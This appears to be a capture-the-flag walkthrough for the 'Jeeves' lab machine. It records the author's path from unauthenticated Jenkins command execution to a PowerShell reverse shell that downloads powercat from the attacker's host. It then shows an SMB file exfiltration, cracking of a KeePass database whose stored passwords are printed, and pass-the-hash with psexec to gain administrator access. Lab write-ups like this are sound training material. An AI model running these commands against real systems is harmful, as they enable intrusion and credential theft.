```
 sudo nmap -sS -sC -sV -p- 10.10.10.63
```
```
Nmap scan report for 10.10.10.63
Host is up (0.026s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-23T20:00:18
|_  start_date: 2025-09-23T19:54:40
|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

port 80 webserver:
![[Pasted image 20250923200203.png]]

if i hit search on hello, im presented a crazy err:
![[Pasted image 20250923200236.png]]

port 50000:
![[Pasted image 20250923200256.png]]

i will rip a gobuster or forexbuster:
```
feroxbuster -u http://10.10.10.63:50000
```
returned nothing....

lets try gobuster:
```
gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50 -x php,html,txt
```

also nothing.... let me look more into Jetty...
found this: https://www.exploit-db.com/raw/50438
```
# Exploit Title: Jetty 9.4.37.v20210219 - Information Disclosure 
# Date: 2021-10-21
# Exploit Author: Mayank Deshmukh
# Vendor Homepage: https://www.eclipse.org/jetty/
# Software Link: https://repo1.maven.org/maven2/org/eclipse/jetty/jetty-distribution/9.4.37.v20210219/
# Version: 9.4.37.v20210219 and 9.4.38.v20210224
# Tested on: Kali Linux
# CVE : CVE-2021-28164

POC #1 - web.xml

GET /%2e/WEB-INF/web.xml HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
hmmm....

i will run gobuster one more time but this time i will use a bigger and better wordlist to completely rule this out... could be a bunny hole if we dont find anything and also i am trying a non raft wordlist:
```
gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php,html,txt
```
```
/askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]
```
nice!
![[Pasted image 20250923201328.png]]

this is DevOps pipeline platform called Jenkins(i use this every single day at work lol)

i see a login and do a google search for default creds:
```
There isn't a single "default Jenkins login" because the initial admin password is randomly generated and stored in a file on the Jenkins server, typically found at
$JENKINS_HOME/secrets/initialAdminPassword
```
interesting...
![[Pasted image 20250923201728.png]]

i am able to add credentials... usually this is used so that pipeline scripts can grab vars and use them without putting them in plaintext in the jenkins scripts

i am also able to create a job and in that job i can easily run a command on target:
ill create a job called "bomb" and add the below
![[Pasted image 20250923202247.png]]

when i run the job the output is:
```
Building in workspace C:\Users\Administrator\.jenkins\workspace\bomb
[bomb] $ cmd /c call C:\Users\kohsuke\AppData\Local\Temp\jenkins6106421549052884824.bat

C:\Users\Administrator\.jenkins\workspace\bomb>whoami
jeeves\kohsuke

C:\Users\Administrator\.jenkins\workspace\bomb>exit 0 
Finished: SUCCESS
```

confirmed RCE!

let throw a rev shell in there and get in!

first ill move powercat.ps1 to my working dir then:
```
powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.16/powercat.ps1'); powercat -c 10.10.14.16 -p 4444 -e cmd"

```

start my netcat listener on port 4444, and run the job!

check listener and i am in as `kohsuke`

lets get user flag on their desktop:
```
C:\Users\kohsuke\Desktop>type user.txt
type user.txt
e3232272596fb4************
```

User PWNED!

---

### Priv Esc

i look around in this jenkins dir i shelled in as:
and find:
`<passwordHash>#jbcrypt:$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO</passwordHash>`
at:
`:\Users\Administrator\.jenkins\users\admin>`

might be something not sure...

```
echo '$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO' > hash.txt

hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

found nothing....

lets check user dir and then if that fails well, i am gonna have to retrace my steps and try to get a powershell rev shell so that i can look up permissions and such, i could also rip bloodhound, if i can get it on the damn system!

woah!
```
C:\Users\kohsuke\Documents

11/03/2017  11:18 PM    <DIR>          .
11/03/2017  11:18 PM    <DIR>          ..
09/18/2017  01:43 PM             2,846 CEH.kdbx
```

kdbx... we just saw this in box keeper, lets take a look shall we...

need to get this over to my machine...

since i dont have a powershell rev shell but i know commands do work via jenkins, lets try to connect to a smb server i will host on my kali and then upload this puppy
it’s now waiting for a Windows client (your Jenkins/target box) to connect and copy files into the directory you exported (`~/htb/jeeves`) under the share name `SHARE`

```
:: Map the remote share to Z:
net use Z: \\10.10.14.16\SHARE

:: Copy the KeePass DB (adjust path if different)
copy "C:\Users\Kohsuke\Documents\CEH.kdbx" Z:\


final command i pasted in jenkins:
powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Command "net use Z: \\10.10.14.16\SHARE; copy 'C:\Users\Kohsuke\Documents\CEH.kdbx' 'Z:\'"
```
ill start smb server
note we also have kohsuke's hash...
```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py SHARE ~/htb/jeeves 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.63,49694)
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)
[*] User JEEVES\kohsuke authenticated successfully
[*] kohsuke::JEEVES:aaaaaaaaaaaaaaaa:eab34f0bfdc2a736660d24e6a1c59d13:01010000000000008026638df42cdc01eb66cf7ef95fbebd00000000010010004b00530056006b005500730070006f00030010004b00530056006b005500730070006f00020010004e005100580062007400480062004c00040010004e005100580062007400480062004c00070008008026638df42cdc0106000400020000000800300030000000000000000000000000300000f43d9b181fd76d294b7958c4616e968094d52f057d8d80c48589c7c349dc71a30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003600000000000000000000000000
[*] Disconnecting Share(1:IPC$)
```
on my kali:
```
file CEH.kdbx        
CEH.kdbx: Keepass password database 2.x KDBX
```

now we dont know master pass so:
```
keepass2john CEH.kdbx > kdbx.hash
```

then lets crack!
```
john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash
```

and we get:
```
moonshine1       (CEH)
```

now i can use:
```
kpcli --kdb CEH.kdbx
Provide the master password: moonshine1
```

there is some crazy stuff in here lol:
```
kpcli:/CEH> show -f 0

Title: Backup stuff
Uname: ?
 Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
  URL: 
Notes: 

kpcli:/CEH> show -f 1

Title: Bank of America
Uname: Michael321
 Pass: 12345
  URL: https://www.bankofamerica.com
Notes: 

kpcli:/CEH> show -f 2

Title: DC Recovery PW
Uname: administrator
 Pass: S1TjAtJHKsugh9oC4VZl
  URL: 
Notes: 

kpcli:/CEH> show -f 6

Title: Keys to the kingdom
Uname: bob
 Pass: lCEUnYPjNfIuPZSzOySA
  URL: 
Notes: 

kpcli:/CEH> show -f 4

Title: It's a secret
Uname: admin
 Pass: F7WhTrSFDKB6sxHU1cUn
  URL: http://localhost:8180/secret.jsp
Notes: 

kpcli:/CEH> show -f 3

Title: EC-Council
Uname: hackerman123
 Pass: pwndyouall!
  URL: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh
Notes: Personal login

kpcli:/CEH> show -f 5

Title: Jenkins admin
Uname: admin
 Pass: 
  URL: http://localhost:8080
Notes: We don't even need creds! Unhackable! 

kpcli:/CEH> show -f 7

Title: Walmart.com
Uname: anonymous
 Pass: Password
  URL: http://www.walmart.com
Notes: Getting my shopping on
```

lets try 

looks like file 0:
`aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00`
is an ntlm hash...

based on the users we saw before in USERS dir on target:
```
Administrator
DefaultAppPool
kohsuke
Public
```

i am gonna throw those in a wordlist called users.txt:
```
crackmapexec smb 10.10.10.63 -u users.txt -H :e0fb1fb85756c24235ff238cbe81fe00
```
```
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```

now i can easily pass the hash here:
first lets check the shares...
```
crackmapexec smb 10.10.10.63 -u Administrator -H e0fb1fb85756c24235ff238cbe81fe00 --shares             
SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.10.10.63     445    JEEVES           [+] Jeeves\Administrator:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
SMB         10.10.10.63     445    JEEVES           [+] Enumerated shares
SMB         10.10.10.63     445    JEEVES           Share           Permissions     Remark
SMB         10.10.10.63     445    JEEVES           -----           -----------     ------
SMB         10.10.10.63     445    JEEVES           ADMIN$          READ,WRITE      Remote Admin
SMB         10.10.10.63     445    JEEVES           C$              READ,WRITE      Default share
SMB         10.10.10.63     445    JEEVES           IPC$                            Remote IPC
```

since 445 is open, `psexec` is a good choice and should work

next:
```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe       
```

wtfff lol
```
Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,637,914,112 bytes free
```

```
type hm.txt
The flag is elsewhere.  Look deeper.
```
```
dir /R
```
```
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,637,914,112 bytes free
```

```
more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```

ROOT PWNED!

for the last part:
## What happened (plain English)

- NTFS files can have a primary data stream (the visible file contents) **and** one or more _alternate data streams_ (named streams attached to the same filename).
    
- `dir` normally shows only the main file. `dir /R` (or special tools) reveals ADS entries like `hm.txt:root.txt:$DATA`.
    
- The attacker/owner stored the flag in the ADS `root.txt` attached to `hm.txt`. That’s why `type hm.txt` showed only “The flag is elsewhere.” and `more < hm.txt:root.txt` printed the secret.